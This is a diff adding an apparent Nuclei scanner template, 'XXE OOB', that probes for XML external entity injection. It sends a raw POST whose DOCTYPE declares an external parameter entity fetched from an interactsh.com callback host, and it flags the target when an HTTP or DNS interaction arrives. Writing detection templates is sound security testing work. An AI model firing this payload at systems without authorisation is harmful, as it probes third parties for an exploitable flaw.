@@ -1,0 +1,29 @@
+id: xxe
+info:
+  author: xxe
+  name: XXE OOB
+  severity: high
+  tags: xxeoobtesting
+requests:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  raw:
+  - 'POST / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Content-Length: 76
+
+    Content-Type: application/xml
+
+
+    <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://c6771f52vtc0000z7rj0gdduozwyyyyyb.interactsh.com/xxe">
+    %xxe; ]>
+
+    '
